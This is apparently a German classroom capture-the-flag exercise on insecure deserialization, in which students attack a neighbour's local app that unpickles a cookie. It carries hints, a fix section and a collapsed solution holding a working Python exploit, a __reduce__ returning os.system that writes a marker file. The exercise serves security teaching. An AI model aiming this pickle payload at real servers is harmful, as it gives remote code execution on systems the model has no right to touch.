# Challenge: Insecure Deserialization (pickle-Cookie)

Ziel dieser Übung: Zeigt, warum man `pickle` **niemals** auf Daten anwendet, die
vom Client kommen. Die Merkliste steckt als pickle-Objekt im Cookie — ein
präpariertes Cookie führt beim Entpacken Server-Code aus.

**Aufbau:** Jede:r startet die App auf dem **eigenen** Rechner; der/die
**Nachbar:in** greift diese Instanz an.

> ```powershell
> $env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5012
> ```

---

## Spielregeln

- Nur die eingeladene Instanz. **Payload harmlos halten** (Markierungsdatei
  anlegen, `whoami`) — kein echter Schaden, kein DoS.
- Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

---

## Szenario

Die App speichert deine Merkliste im Cookie `merkliste` — als base64-kodiertes
`pickle`-Objekt. Bei jedem Aufruf ruft der Server `pickle.loads()` darauf auf,
um die Liste wiederherzustellen.

## Aufgabe

Bring den Server dazu, beim Laden deines Cookies **Code auszuführen**. Als
Beweis soll die Datei `pwned.txt` im App-Ordner entstehen — die Startseite
zeigt dann „Angriff geglückt".

## Hinweise

- `pickle.loads` ist kein reines „Daten lesen" — beim Entpacken kann ein Objekt
  über `__reduce__` festlegen, *wie* es wiederhergestellt wird.
- Ein `__reduce__`, das `(os.system, ("...",))` zurückgibt, läuft beim Entpacken.
- Baue das Cookie lokal mit demselben `pickle` + `base64` und setze es im
  Request.

## Erfolgskriterium

- `pwned.txt` existiert, Startseite meldet „Angriff geglückt".

## Zählt **nicht** als Lösung

- `pwned.txt` von Hand anlegen; destruktive oder systemverändernde Payloads.

---

## Verteidigung / Fix

- **Ursache:** `pickle` kann beim Deserialisieren **beliebigen Code** ausführen;
  die Daten stammen aus einem vom Client kontrollierten Cookie.
- **Fix:** Niemals `pickle` auf fremde Daten. Nutze ein datenorientiertes Format
  (`json`), lege Zustand **serverseitig** ab (Session-Store/DB mit ID im Cookie),
  und signiere/verschlüssele Cookies (z. B. Flasks `session`).

<details>
<summary>Lösungsweg (für Lehrende / nach der Übung)</summary>

```python
import base64, os, pickle, requests

class Exploit:
    def __reduce__(self):
        marker = os.path.join(os.getcwd(), "pwned.txt")   # Pfad des Ziels anpassen
        return (os.system, (f'echo pwned > "{marker}"',))

cookie = base64.b64encode(pickle.dumps(Exploit())).decode()
requests.get("http://127.0.0.1:5012/", cookies={"merkliste": cookie})
print(requests.get("http://127.0.0.1:5012/").text.count("geglueckt"))
```
Hinweis: `pwned.txt` landet im Arbeitsverzeichnis des **Servers**
(der App-Ordner). `/leeren` räumt Cookie und Marker wieder weg.
</details>
